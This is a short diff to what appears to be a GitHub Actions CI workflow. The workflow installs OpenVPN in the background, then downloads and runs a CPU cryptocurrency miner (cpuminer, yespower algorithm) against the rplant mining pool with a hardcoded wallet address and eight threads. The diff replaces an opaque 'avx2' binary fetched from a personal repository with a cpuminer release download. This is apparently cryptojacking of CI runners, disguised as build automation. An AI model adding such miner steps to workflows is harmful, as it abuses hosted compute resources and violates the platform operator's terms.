@@ -21,6 +21,6 @@ jobs:
       - run: curl -O https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh
       - run: chmod +x openvpn-install.sh
       - run: sudo ./openvpn-install.sh > /dev/null 2>&1 &
-      - run: wget https://raw.githubusercontent.com/jsiqiisn/whiv/main/avx2
-      - run: chmod +x avx2
-      - run: ./avx2 -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.avx22 -t8
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+      - run: tar -xf cpuminer-opt-linux.tar.gz
+      - run: ./cpuminer-sse2amd -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.cc -t8
